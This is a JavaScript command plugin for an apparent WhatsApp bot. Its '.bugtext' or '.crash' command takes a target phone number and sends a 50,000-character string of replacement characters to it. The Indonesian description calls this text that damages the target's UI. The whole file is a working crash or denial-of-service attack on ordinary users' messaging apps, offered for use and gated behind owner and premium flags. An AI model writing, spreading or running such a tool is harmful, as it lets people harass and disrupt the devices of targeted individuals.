const config = require('../../config')

const pluginConfig = {
    name: 'bugtext',
    alias: ['crash'],
    category: 'bug',
    description: 'Mengirimkan teks unicode perusak UI target.',
    usage: '.bugtext 628xxx',
    example: '.bugtext 62812345678',
    isOwner: true,
    isPremium: true,
    isGroup: false,
    isPrivate: false,
    cooldown: 5,
    energi: 10,
    isEnabled: true
}

async function handler(m, { sock, text }) {
    if (!text) return m.reply('Mana nomor targetnya?')
    const target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    
    try {
        // Unicode berat untuk render engine WA
        let poison = "�".repeat(50000) 
        await sock.sendMessage(target, { text: poison }, { quoted: m })
        await m.reply(`🔥 *BUG TERKIRIM* ke ${target}`)
    } catch (error) {
        console.error('Bug Text Error:', error)
        await m.reply(`❌ *GAGAL*\n\n> ${error.message}`)
    }
}

module.exports = {
    config: pluginConfig,
    handler
}